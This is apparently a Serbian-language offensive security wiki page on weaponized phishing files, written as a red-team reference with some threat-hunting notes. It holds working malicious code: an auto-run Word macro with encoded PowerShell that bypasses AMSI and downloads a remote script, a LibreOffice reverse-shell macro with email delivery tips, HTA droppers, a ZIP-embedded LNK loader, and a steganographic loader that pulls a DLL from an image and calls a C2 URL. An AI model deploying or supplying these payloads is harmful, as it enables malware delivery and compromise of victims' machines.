# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Office Documents

Microsoft Word vrši validaciju podataka fajla pre otvaranja fajla. Validacija podataka se sprovodi u obliku identifikacije strukture podataka, u odnosu na OfficeOpenXML standard. Ako dođe do bilo kakve greške tokom identifikacije strukture podataka, fajl koji se analizira neće biti otvoren.

Obično Word fajlovi koji sadrže makroe koriste `.docm` ekstenziju. Međutim, moguće je preimenovati fajl promenom ekstenzije i i dalje zadržati sposobnost izvršavanja makroa.\
Na primer, RTF fajl po dizajnu ne podržava makroe, ali će DOCM fajl preimenovan u RTF biti obrađen od strane Microsoft Word-a i biće sposoban za izvršavanje makroa.\
Ista interna logika i mehanizmi primenjuju se na sav softver iz Microsoft Office Suite (Excel, PowerPoint itd.).

Možete koristiti sledeću komandu da proverite koje ekstenzije će biti izvršavane od strane nekih Office programa:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX fajlovi koji referenciraju udaljeni template (File –Options –Add-ins –Manage: Templates –Go) koji uključuje macros takođe mogu da “execute” macros.

### External Image Load

Idi na: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Moguće je koristiti macros za pokretanje proizvoljnog koda iz dokumenta.

#### Autoload functions

Što su češće, to je verovatnije da će ih AV detektovati.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Ručno uklonite metapodatke

Idite na **File > Info > Inspect Document > Inspect Document**, što će otvoriti Document Inspector. Kliknite **Inspect** i zatim **Remove All** pored **Document Properties and Personal Information**.

#### Doc Extension

Kada završite, izaberite padajući meni **Save as type**, i promenite format sa **`.docx`** na **Word 97-2003 `.doc`**.\
Uradite ovo zato što **ne možete sačuvati macro's unutar `.docx`** i postoji **stigma** **oko** macro-enabled **`.docm`** ekstenzije (npr. sličica ikone ima ogromno `!` i neki web/email gateway ih potpuno blokiraju). Zato je ova **legacy `.doc` ekstenzija najbolji kompromis**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer dokumenti mogu da ugrade Basic macros i da ih auto-execute kada se fajl otvori tako što se macro veže za događaj **Open Document** (Tools → Customize → Events → Open Document → Macro…). Jednostavan reverse shell macro izgleda ovako:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Imajte na umu udvostručene navodnike (`""`) unutar stringa – LibreOffice Basic ih koristi za escape literalnih navodnika, tako da payloads koji se završavaju sa `...==""")` zadržavaju i unutrašnju komandu i Shell argument u uravnoteženom stanju.

Delivery tips:

- Sačuvajte kao `.odt` i povežite macro sa događajem dokumenta tako da se pokrene odmah po otvaranju.
- Kada šaljete email sa `swaks`, koristite `--attach @resume.odt` (`@` je obavezan kako bi se poslali bajtovi fajla, a ne string imena fajla, kao attachment). Ovo je ključno kada se zloupotrebljavaju SMTP servers koji prihvataju proizvoljne `RCPT TO` primaoce bez validacije.

## HTA Files

An HTA is a Windows program that **kombinuje HTML i scripting languages (such as VBScript and JScript)**. Generiše korisnički interfejs i izvršava se kao "fully trusted" aplikacija, bez ograničenja browser security modela.

HTA se izvršava pomoću **`mshta.exe`**, koji je tipično **instaliran** zajedno sa **Internet Explorer**, što znači da je **`mshta` zavisan od IE**. Ako je IE deinstaliran, HTAs neće moći da se izvrše.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Prisiljavanje NTLM autentifikacije

Postoji nekoliko načina da se **prisili NTLM autentifikacija "remotely"**, na primer, možete dodati **nevidljive slike** u emailove ili HTML koje će korisnik otvoriti (čak i HTTP MitM?). Ili poslati žrtvi **adresu fajlova** koja će **pokrenuti** **autentifikaciju** samo pri **otvaranju foldera.**

**Proverite ove ideje i još mnogo toga na sledećim stranicama:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Ne zaboravite da ne možete samo ukrasti hash ili autentifikaciju, već i **izvršiti NTLM relay napade**:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Veoma efikasne kampanje isporučuju ZIP koji sadrži dva legitimna mamca dokumenta (PDF/DOCX) i zlonamerni .lnk. Trik je u tome što je stvarni PowerShell loader smešten unutar sirovih bajtova ZIP-a nakon jedinstvenog markera, a .lnk ga izdvaja i pokreće potpuno u memoriji.

Tipičan tok koji implementira .lnk PowerShell one-liner:

1) Pronađi originalni ZIP na uobičajenim lokacijama: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, i parent trenutnog working directory-ja.
2) Pročitaj ZIP bajtove i pronađi hardcoded marker (npr. xFIQCV). Sve nakon markera je embedded PowerShell payload.
3) Kopiraj ZIP u %ProgramData%, ekstraktuj ga tamo, i otvori mamac .docx da deluje legitimno.
4) Zaobiđi AMSI za trenutni process: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Deobfusciraj sledeću stage (npr. ukloni sve # znakove) i izvrši je u memoriji.

Primer PowerShell skeleton-a za izdvajanje i pokretanje embedded stage-a:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Napomene
- Dostava često zloupotrebljava reputabilne PaaS poddomene (npr. *.herokuapp.com) i može da ograniči payloads (servira benigni ZIP na osnovu IP/UA).
- Sledeća faza često dekriptuje base64/XOR shellcode i izvršava ga preko Reflection.Emit + VirtualAlloc kako bi se minimizovali disk artefakti.

Persistence korišćena u istom lancu
- COM TypeLib hijacking Microsoft Web Browser control-a tako da IE/Explorer ili bilo koja aplikacija koja ga ugrađuje automatski ponovo pokrene payload. Pogledajte detalje i komande spremne za upotrebu ovde:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP datoteke koje sadrže ASCII marker string (npr. xFIQCV) dodat na archive data.
- .lnk koji enumerira parent/user foldere da locira ZIP i otvara decoy document.
- AMSI tampering preko [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Dugotrajne business niti koje završavaju linkovima hostovanim pod trusted PaaS domenima.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Još jedan ponavljajući obrazac je **`.lnk` koji se predstavlja kao dokument** i odmah otvara benigni lure, dok u pozadini priprema pravi lanac.

Uočeni workflow:
1. Shortcut **maskira se kao PDF** i koristi `conhost.exe` ili sličan proxy da pokrene obfuskovani PowerShell downloader.
2. PowerShell fragmentira očigledne tokene (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) tako da naivne detekcije koje traže `iwr`, `gci`, `ren`, `cpi` ili `schtasks` promaše komandu.
3. Stager prvo preuzima **decoy document**, otvara ga za žrtvu, a zatim rekonstruiše malicious fajlove u pozadini.
4. Payloads mogu biti upisani sa **junk ekstenzijama** i zatim preimenovani uklanjanjem filler karaktera, čime se odlaže pojava očiglednih `.exe` / `.cpl` artefakata.
5. Persistence se uspostavlja pomoću **scheduled task-a zasnovanog na minutima** koji pokreće trusted host binary iz user-writable putanje.

Minimalni hunting tragovi iz ovog obrasca:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Koristan staging raspored koji treba prepoznati je:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ili `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Zašto je druga faza stealthy

U Rapid7 case study, scheduled task je više puta pokretao **`Fondue.exe`** iz `C:\Users\Public\`. Pošto je **`APPWIZ.cpl`** bio postavljen pored njega i eksportovao **`RunFODW`**, trusted Microsoft binary je side-loadovao napadačev CPL umesto legitimne sistemske kopije.

CPL zatim:
- Čita **AES-256-CBC** blob iz `C:\Windows\Tasks\editor.dat`
- Dešifruje ga kroz **Windows CNG / `bcrypt.dll`**
- Alocira izvršnu memoriju i kopira dešifrovan shellcode
- Izvršava ga indirektno prosleđujući pokazivač na shellcode kao callback za **`EnumUILanguagesW`**

Taj poslednji korak vredi posebno hunting-ovati: malware često izbegava direktan `((void(*)())buf)()` jump i umesto toga zloupotrebljava **legitimate callback-taking WinAPI** da prenese izvršavanje.

Dešifrovani payload u ovoj kampanji bio je **Donut** shellcode, koji je zatim mapirao finalni PE potpuno u memoriji i patchovao **AMSI/WLDP/ETW** u trenutnom procesu pre nego što je predao izvršavanje dalje. Za dublje beleške o side-loading i memory-resident post-processing, pogledajte:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktični hunting pivot-i:
- `.lnk` koji pokreće `powershell.exe` ili `conhost.exe` praćen vidljivim decoy dokumentom.
- Kratkotrajni downloadi u **`C:\Users\Public\`** praćeni trenutnim preimenovanjima iz besmislenih ekstenzija.
- Scheduled tasks sa bezličnim imenima kao što je `GoogleErrorReport` koji se izvršavaju iz **user-writable directories**.
- Trusted binaries koji učitavaju **`.cpl` / `.dll`** fajlove iz istog non-system direktorijuma.
- Base64 tekstualni blobovi upisani pod **`C:\Windows\Tasks\`** i zatim pročitani od strane side-loaded modula.

## Steganography-delimited payloads in images (PowerShell stager)

Recent loader chains isporučuju obfuscirani JavaScript/VBS koji dešifruje i pokreće Base64 PowerShell stager. Taj stager preuzima sliku (često GIF) koja sadrži Base64-enkodovan .NET DLL skriven kao običan tekst između jedinstvenih start/end markera. Script traži ove delimitere (primeri viđeni u praksi: «<<sudo_png>> … <<sudo_odt>>>»), izvlači tekst između njih, Base64-dekoduje ga u bajtove, učitava assembly in-memory i poziva poznatu entry metodu sa C2 URL-om.

Workflow
- Stage 1: Archived JS/VBS dropper → dešifruje embedded Base64 → pokreće PowerShell stager sa -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → preuzima sliku, izdvaja marker-delimited Base64, učitava .NET DLL in-memory i poziva njegovu metodu (npr. VAI) prosleđujući C2 URL i opcije.
- Stage 3: Loader preuzima finalni payload i tipično ga ubacuje preko process hollowing u trusted binary (najčešće MSBuild.exe). Više o process hollowing i trusted utility proxy execution ovde:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example za izdvajanje DLL-a iz slike i pozivanje .NET metode in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Beleške
- Ovo je ATT&CK T1027.003 (steganografija/skrivanje markera). Markeri se razlikuju između kampanja.
- AMSI/ETW bypass i deobfuskacija stringova se često primenjuju pre učitavanja assembly-ja.
- Hunting: skenirajte preuzete slike na poznate delimitere; identifikujte PowerShell koji pristupa slikama i odmah dekodira Base64 blob-ove.

Pogledajte i stego alate i carving tehnike:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Ponovljena početna faza je mala, snažno obfuskovana `.js` ili `.vbs` datoteka isporučena unutar arhive. Njena jedina svrha je da dekodira ugrađeni Base64 string i pokrene PowerShell sa `-nop -w hidden -ep bypass` kako bi podigla sledeću fazu preko HTTPS.

Skeletna logika (apstraktno):
- Pročitaj sadržaj sopstvene datoteke
- Pronađi Base64 blob između junk stringova
- Dekodiraj u ASCII PowerShell
- Izvrši pomoću `wscript.exe`/`cscript.exe` koji pozivaju `powershell.exe`

Indikatori za hunting
- Arhivirane JS/VBS priloge koji pokreću `powershell.exe` sa `-enc`/`FromBase64String` u komandnoj liniji.
- `wscript.exe` koji pokreće `powershell.exe -nop -w hidden` iz user temp putanja.

## Windows files to steal NTLM hashes

Pogledajte stranicu o **mestima za krađu NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
